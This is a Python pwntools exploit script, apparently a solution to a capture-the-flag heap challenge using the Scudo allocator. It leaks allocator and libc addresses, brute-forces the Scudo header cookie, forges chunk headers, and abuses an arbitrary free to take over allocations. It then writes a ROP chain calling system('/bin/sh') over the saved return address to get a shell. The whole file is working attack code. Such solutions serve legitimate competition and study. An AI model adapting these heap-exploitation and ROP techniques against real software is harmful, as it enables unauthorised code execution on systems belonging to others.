from pwn import *
from scudocookie import bruteforce, calc_checksum


gs = """
source ./scudo-69d4e5ae7b97.py
"""

def forge_header(address, cookie, new_header) -> bytes:
    new_checksum = calc_checksum(address, cookie, new_header)
    forged_header = new_header + (new_checksum << 0x30)
    return forged_header.to_bytes(8, 'little')

def add_shield(r, size, desc, wait=True):
    r.sendline(b"1")
    r.sendlineafter(b">", str(size).encode())
    r.sendlineafter(b">", desc)
    if wait:
        r.recvuntil(b">")

def switch_shield(r, new):
    r.sendline(b"2")
    r.sendafter(b">", new)
    r.recvuntil(b">")

def print_shield(r):
    r.sendline(b"4")
    l = r.recvuntil(b"\n>")
    return l

def free_shield(r):
    r.sendline(b"3")
    r.recvuntil(b"\n>")

def change_bio(r, bio):
    r.sendline(b"5")
    r.sendlineafter(b"biografia >", bio)
    r.recvuntil(b"\n>")

def readl(r, addr):
    switch_shield(r, p64(addr))
    l = print_shield(r)
    l = l.split(b"Prezzo: ")[-1]
    l = l.split(b"\n")[0]
    l = int(l)
    return l

def arb_free(r, addr):
    switch_shield(r, p64(addr))
    free_shield(r)

while True:
    try:
        if args["DOCKER"]:
            r = remote("127.0.0.1", 12010)
        elif args["LOCAL"]:
            r = process(["./ld-linux-x86-64.so.2", "./link"], env={"LD_PRELOAD": "./libscudo-linux.so"})
        else:
            r = remote("challs.polygl0ts.ch", 12010)
        malloc = r.recvline()
        malloc = malloc.split(b": ")[-1]
        malloc = int(malloc,16)
        libscudo = malloc - 0x18330
        print(f'malloc address: {hex(malloc)}, libscudo: {hex(libscudo)}')
        r.recvuntil(b">")
        add_shield(r, 0x78, b"asfd")
        change_bio(r, 8*b"A")
        Link_offset = None
        Link = None
        # scan for the shield
        for i in range(0,0x6000,8):
            switch_shield(r, p16(i))
            l = print_shield(r)
            if b'Descrizione: AAAAAAAA' in l:
                Link_offset = i
                Link = l.split(b"Prezzo: ")[-1]
                Link = Link.split(b"\n")[0]
                Link = int(Link)
                print(Link)
                print(f'Link found: {hex(i)}, {hex(Link)}')
                break
        if Link_offset is None:
            print('failed to find it')
            r.close()
            continue
        break
    except:
        r.close()
        continue
if args["GDB"]:
    gdb.attach(r, gdbscript=gs)

# get cookie
header = readl(r, Link-0x10)
print(f'leaked header: {hex(header)}')
checksum = header >> 0x30
header = header & ((1 << 0x30)-1)
print(f'checksum: {hex(checksum)}')
cookie = bruteforce(Link, checksum, header)
print(f'scudo cookie: {hex(cookie)}')
perclass_region_addr = readl(r, libscudo + 0x36048)
print(f'perclass address: {hex(perclass_region_addr)}')
perclass_5 = perclass_region_addr - 0x2500
print(f'perclass 5: {hex(perclass_5)}')
perclass_5_free_chunk_addr = perclass_5 + 0x40
# fill perclass free list to be able to reach next class perclass
fake_primary = Link + 0x20
primary_header = 0xe0108
for _ in range(0,6):
    change_bio(r, p64(0) + forge_header(fake_primary, cookie, primary_header) + p64(0))
    arb_free(r, fake_primary)
# now create two fake primary chunks and free them to build fake linked list
largechunk_start = Link + 0x10
change_bio(r, p64(0) + forge_header(fake_primary, cookie, primary_header) + p64(0))
arb_free(r, fake_primary)
change_bio(r, p64(0) + forge_header(fake_primary, cookie, primary_header) + p64(0))
arb_free(r, fake_primary)
# just here to add more chunks to the list
largechunk_header_addr = largechunk_start + 0x40
largechunk_header = forge_header(largechunk_header_addr, cookie, 0x8100)
secondary_full = b""
secondary_full += p64(perclass_5_free_chunk_addr) + p64(perclass_5_free_chunk_addr)
secondary_full += p64(0xdeadbeef) + p64(0x30000)
secondary_full += p64(0xdeadbeff) + p64(0x30000)
secondary_full += largechunk_header + p64(0)
change_bio(r, p64(0) + secondary_full)
arb_free(r, largechunk_header_addr)
libc_mmap = readl(r, libscudo + 0x31d70)
print(f'libc mmap: {hex(libc_mmap)}')
libc = libc_mmap - 0x11ea10
print(f' libc base: {hex(libc)}')
main_ret = libc + 0x29d90
stack_addr = readl(r, libc + 0x21b530) & 0xfffffffffffffff0
stored_main_ret =  None
for i in range(0, 0x500):
    print(f'testing {hex(stack_addr-i*8)}')
    tmp = readl(r, stack_addr-i*8)

    if tmp == main_ret:
        stored_main_ret = stack_addr-i*8
        print(f'found stack where main return is stored: {hex(stored_main_ret)}')
        break
add_shield(r, 0xd8, b"A"*0xa8+ p64(0x60004) + p64(0x140)+4*p64(stored_main_ret-0x60))
system = libc + 0x50d70 
ret = libc +0x000000000002a3e6
pop_rdi = libc + 0x000000000002a3e5
bin_sh = libc + 0x1d8678
add_shield(r, 240, 16 * b"A" + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system), wait=False)
# now 4 allocations from size 0x100 are fully under our control
r.interactive()
